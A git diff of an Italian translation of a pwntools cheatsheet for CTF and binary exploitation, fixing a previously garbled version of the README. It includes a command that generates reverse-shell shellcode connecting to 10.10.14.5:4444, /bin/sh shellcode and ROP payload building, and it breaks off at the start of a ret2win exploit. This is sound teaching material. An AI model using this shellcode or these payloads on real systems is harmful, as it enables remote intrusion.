@@ -1,45 +1,48 @@
-# 🔍 pwntools - Scheda di riferimento completa
-
 <!-- language-home-navigation -->
-[🏠 Pagina iniziale italiana](../../README.it.md) • [🌐 Languages](../../README.md#-available-languages)
+[🏠 Home Page Italiana](../../README.it.md) • [🌐 Languages](../../README.md#-available-languages)
 
-[🇬🇧 English](../README.md) • [🇹🇷 Türkçe Sürüm](README.tr.md) • [🇬🇷 Ελληνικά](README.el.md)
+[🇹🇷 Türkçe](README.tr.md) • [🇩🇪 Deutsch](README.de.md) • [🇪🇸 Español](README.es.md) • [🇫🇷 Français](README.fr.md)
 
-
-[pwntools](https://github.com/Gallopsled/pwntools) is a best-in-class CTF framework and exploit development library written in Python. Designed for rapid prototyping, binary exploitation (pwn), and reverse engineering, it provides a comprehensive suite of command-line tools (`pwn cyclic`, `pwn checksec`, `pwn asm`, `pwn shellcraft`) alongside a high-level Python API for interacting with local processes and remote sockets.
-
----
-
-## 📋 Indice
-
-- [[ROP Chain Construction](#rop-chain-construction)](#core-capabilities)
-- [Installazione](#installation)
-- [Installazione](#command-line-utilities-pwn-cmd)
-  - [` `pwn cyclic` (Buffer Offset Calculation)](#pwn-cyclic-buffer-offset-calculation)
-  - [` `pwn checksec` (Mitigation Inspection)](#pwn-checksec-mitigation-inspection)
-  - [` `pwn asm` & `pwn disasm` (Assembler / Disassembler)](#pwn-asm--pwn-disasm-assembler--disassembler)
-  - [` `pwn shellcraft` (Shellcode Generator)](#pwn-shellcraft-shellcode-generator)
-  - [` `pwn template` (Exploit Skeleton Generator)](#pwn-template-exploit-skeleton-generator)
-- [` pwn template` (Exploit Skeleton Generator)](#python-exploit-development-workflow)
-  - [Process & Remote Socket Connections](#process--remote-socket-connections)
-  - [ELF Parsing & Symbols](#elf-parsing--symbols)
-  - [ROP Chain Construction](#rop-chain-construction)
-  - [Packing & Endianness (`p32` / `p64`)](#packing--endianness-p32--p64)
-- [Esempi pratici](#complete-exploit-example-buffer-overflow--ret2win)
+[🇵🇹 Português](README.pt.md) • [🇷🇺 Русский](README.ru.md) • [🇨🇳 简体中文](README.zh-CN.md) • [🇸🇦 العربية](README.ar.md) • [🇬🇷 Ελληνικά](README.el.md) • [🇳🇴 Norsk](README.nb.md) • [🇬🇧 English](../README.md)
 
 ---
 
-## [ROP Chain Construction](#rop-chain-construction)
 
-- **Tubes Architecture**: Unified interface for interacting with local processes (`process`), remote TCP sockets (`remote`), and SSH sessions (`ssh`).
-- **Binary & Gadget Inspection**: Automated ELF symbol resolution, GOT/PLT lookup, and automated ROP chain synthesis.
-- **On-the-Fly Assembly**: Instant translation between assembly mnemonics and opcodes across x86, x86_64, ARM, MIPS, and AArch64.
-- **Shellcode Synthesis**: Pre-built, customizable shellcode templates for reverse shells, execve, file reading, and evasion.
+# pwntools Cheatsheet
+
+[pwntools](https://github.com/Gallopsled/pwntools) è un framework CTF di prima qualità e una libreria di sviluppo di exploit scritta in Python. Progettato per la prototipazione rapida, lo sfruttamento binario (pwn) e il reverse engineering, fornisce una suite completa di strumenti da riga di comando (`pwn cyclic`, `pwn checksec`, `pwn asm`, `pwn shellcraft`) insieme a un'API Python di alto livello per l'interazione con processi locali e socket remoti.
+
+---
+
+## Sommario
+
+- [Funzionalità principali](#capacità-core)
+- [Installazione](#installazione)
+- [Utilità della riga di comando (`pwn <cmd>`)](#utilità-della-riga di comando-pwn-cmd)
+  - [`pwn cyclic` (Calcolo dell'offset del buffer)](#pwn-calcolo-dell'offset-del-buffer-ciclico)
+  - [`pwn checksec` (ispezione di mitigazione)](#pwn-checksec-mitigazione-ispezione)
+  - [`pwn asm` e `pwn disasm` (Assemblatore/Disassemblatore)](#pwn-asm--pwn-disasm-assemblatore--disassemblatore)
+  - [`pwn shellcraft` (generatore di shellcode)](#pwn-shellcraft-shellcode-generatore)
+  - [`pwn template` (Generatore di scheletro di exploit)](#pwn-template-exploit-skeleton-generator)
+- [Flusso di lavoro di sviluppo dell'exploit Python](#flusso di lavoro-di-sviluppo-exploit-python)
+  - [Connessioni al processo e al socket remoto](#processo--connessioni-socket-remote)
+  - [Analisi e simboli ELF](#elf-parsing--simboli)
+  - [Costruzione catena ROP](#costruzione-catena-rop)
+  - [Packing ed Endianness (`p32` / `p64`)](#packing--endianness-p32--p64)
+- [Esempio di exploit completo (Buffer Overflow + ret2win)](#exploit-completo-esempio-buffer-overflow--ret2win)
+
+---
+
+## Funzionalità principali
+
+- **Architettura Tubes:** Interfaccia unificata per l'interazione con processi locali (`process`), socket TCP remoti (`remote`) e sessioni SSH (`ssh`).
+- **Ispezione binari e gadget:** Risoluzione automatizzata dei simboli ELF, ricerca GOT/PLT e sintesi automatizzata della catena ROP.
+- **Assemblaggio al volo:** Traduzione istantanea tra mnemonici di assemblaggio e codici operativi su x86, x86_64, ARM, MIPS e AArch64.
+- **Sintesi shellcode:** modelli shellcode precostruiti e personalizzabili per shell inverse, execve, lettura di file ed evasione.
 
 ---
 
 ## Installazione
-
 ```bash
 # Ubuntu / Debian / Kali Linux
 sudo apt-get update && sudo apt-get install -y python3-pwntools
@@ -50,14 +53,12 @@ pip3 install pwntools
 # Verify command-line utilities
 pwn version
 ```
-
 ---
 
-## Installazione
+## Utilità della riga di comando (`pwn <cmd>`)
 
-### ` pwn cyclic` (Buffer Offset Calculation)
-Generate unique De Bruijn cyclic patterns to determine the exact crash offset (EIP / RIP overwrite):
-
+### `pwn cyclic` (Calcolo dell'offset del buffer)
+Genera modelli ciclici De Bruijn unici per determinare l'esatto offset del crash (sovrascrittura EIP/RIP):
 ```bash
 # Generate a 200-byte unique pattern
 pwn cyclic 200
@@ -69,15 +70,13 @@ pwn cyclic -l 0x6161616c
 # 64-bit architecture cyclic pattern lookup
 pwn cyclic -l "faaa" -n 8
 ```
-
-### ` pwn checksec` (Mitigation Inspection)
-` pwn cyclic` (Buffer Offset Calculation)
+### `pwn checksec` (Ispezione di mitigazione)
+Controlla le mitigazioni della sicurezza (Canary, NX, PIE, RELRO, ASLR) di qualsiasi eseguibile ELF:
 ```bash
 pwn checksec /path/to/binary
 ```
-
-### ` pwn asm` & `pwn disasm` (Assembler / Disassembler)
-Assemble instructions into shellcode bytes directly from the terminal:
+### `pwn asm` e `pwn disasm` (Assemblatore/Disassemblatore)
+Assembla le istruzioni in byte di shellcode direttamente dal terminale:
 ```bash
 # Assemble x86 instructions to hex bytes
 pwn asm "xor eax, eax; push eax"
@@ -88,9 +87,8 @@ pwn asm -c amd64 "mov rax, 59; syscall" --format hex
 # Disassemble raw hex bytes back to assembly
 pwn disasm "31c050682f2f7368682f62696e89e3505389e1b00bcd80" -c i386
 ```
-
-### ` pwn shellcraft` (Shellcode Generator)
-Generate production-ready shellcode payloads directly to terminal stdout or binary files:
+### `pwn shellcraft` (Generatore di codici shell)
+Genera payload shellcode pronti per la produzione direttamente sullo stdout del terminale o su file binari:
 ```bash
 # Generate Linux x64 execve /bin/sh shellcode in hex
 pwn shellcraft amd64.linux.sh --format hex
@@ -101,18 +99,16 @@ pwn shellcraft amd64.linux.connect 10.10.14.5 4444
 # Output pure raw bytes directly into a file
 pwn shellcraft amd64.linux.sh --format raw > shellcode.bin
 ```
-
-### ` pwn template` (Exploit Skeleton Generator)
-Generate a battle-tested Python exploit template for a target binary and remote server:
+### `pwn template` (Generatore di scheletri di exploit)
+Genera un modello di exploit Python testato sul campo per un binario di destinazione e un server remoto:
 ```bash
 pwn template ./vuln_binary --host 10.10.10.100 --port 1337 > exploit.py
 ```
-
 ---
 
-## ` pwn template` (Exploit Skeleton Generator)
+## Flusso di lavoro per lo sviluppo degli exploit Python
 
-### Process & Remote Socket Connections
+### Connessioni al processo e al socket remoto
 ```python
 from pwn import *
 
@@ -133,18 +129,16 @@ io.sendline(b'Alice')
 # Switch to interactive shell once exploit succeeds
 io.interactive()
 ```
-
-### ELF Parsing & Symbols
-Python Exploit Development Workflow
+### Analisi e simboli ELF
+Leggi automaticamente gli indirizzi delle funzioni, le tabelle GOT e PLT senza ricerche GDB manuali:
 ```python
 elf = ELF('./vuln_binary')
 print(f"Target function address: {hex(elf.symbols['win'])}")
 print(f"puts() PLT address: {hex(elf.plt['puts'])}")
 print(f"puts() GOT address: {hex(elf.got['puts'])}")
 ```
-
-### ROP Chain Construction
-Build Return-Oriented Programming (ROP) chains automatically:
+### Costruzione di catene ROP
+Costruisci automaticamente catene di programmazione orientata al ritorno (ROP):
 ```python
 elf = ELF('./vuln_binary')
 rop = ROP(elf)
@@ -155,9 +149,8 @@ print(rop.dump())
 
 payload = b"A" * 40 + rop.chain()
 ```
-
-### Packing & Endianness (`p32` / `p64`)
-Convert integer memory addresses into little-endian bytes:
+### Imballaggio ed Endianness (`p32` / `p64`)
+Converti indirizzi di memoria interi in byte little-endian:
 ```python
 # 32-bit little-endian packing
 address_32 = p32(0x080484b6)  # Returns b'\xb6\x84\x04\x08'
@@ -168,11 +161,9 @@ address_64 = p64(0x0000000000401156)
 # Unpacking bytes to integer
 val = u64(b"\x56\x11\x40\x00\x00\x00\x00\x00")
 ```
-
 ---
 
-## Esempi pratici
-
+## Esempio di exploit completo (Buffer Overflow + ret2win)
 ```python
 #!/usr/bin/env python3
 from pwn import *
